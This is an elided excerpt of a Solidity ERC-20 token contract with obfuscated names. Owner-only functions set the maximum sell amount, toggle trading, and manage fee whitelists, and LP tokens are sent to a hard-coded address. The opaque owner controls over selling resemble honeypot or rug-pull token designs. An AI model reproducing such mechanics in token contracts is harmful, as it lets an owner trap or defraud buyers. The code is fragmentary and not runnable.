...
abstract contract AToken is IERC20, Ownable {
    ...
    uint256 public _dias = 100;
    uint256 public _diat = 0;//N
    uint256 public _uyy = 0;//N
    uint256 public _ugg = 100;
    uint256 public _uhj = 0;//N
    ...
    function cozd(uint256 _zd) public onlyOwner{
        
        zd = _zd;
    
    }

    function cenhl(bool status) public onlyOwner {
        limitEnable = status;
    }
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == goMoonBlock) {
                    require(0 < geio && _swapPairList[to], "!geio");
                }
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _dias + _diat + _ugg + _uyy + _uhj;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _ugg + _uyy + _uhj;
                require(tAmount <= zd,"over max zd amount");
            } else {
                swapFee = _dias + _diat;
                require(tAmount <= seb,"over max seb amount");
            }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 fundAmount = usdtBalance * (_dias + _ugg) * 2 / swapFee;
        ...
        if (lpAmount > 0) {
            ...
            if (lpusdtt > 0) {//=0xB821bb072f08A338962272923f9f4221B69094FC (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpusdtt, 0, 0, address(0xd568c98c92Ca4eA0BF6E4d9C87c8AA14526cB5eD), block.timestamp
                );
            }
        }
    }
    ...
    function dk() external onlyOwner {
        geio = 0;
    }

    function sbo() external onlyOwner {
        require(0 == goMoonBlock, "trading");
        goMoonBlock = block.number;
    }

    function sbool(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }
    
    function setjdbool(address[] memory addrs, bool enable) external onlyFunder {
        for (uint i = 0; i < addrs.length; i++) {
            _feeWhiteList[addrs[i]] = enable;
        }
    }

    function setshengbool(address[] calldata addrs, bool enable) external onlyFunder {
        for (uint i = 0; i < addrs.length; i++) {
        _feeWhiteList[addrs[i]] = enable;
        }
    }
...
contract ken is AToken {
    constructor() AToken(
        ...
        18,//De
        100000,//Su 
        address(0xd568c98c92Ca4eA0BF6E4d9C87c8AA14526cB5eD),//
        address(0xd568c98c92Ca4eA0BF6E4d9C87c8AA14526cB5eD)//
    ){
    }
}